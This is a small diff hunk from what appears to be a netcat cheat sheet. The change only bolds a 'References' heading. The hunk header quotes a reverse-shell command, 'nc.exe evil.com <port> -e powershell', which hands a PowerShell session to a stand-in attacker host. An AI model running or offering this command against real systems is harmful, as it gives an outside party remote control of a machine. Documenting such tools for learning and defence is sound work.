@@ -73,7 +73,7 @@ PS C:\Users\Administrator> C:\path\nc.exe evil.com <port> -e powershell
 
 ---
 
-References
+**References**
 
 - [netcat](https://www.kali.org/tools/netcat/)
 
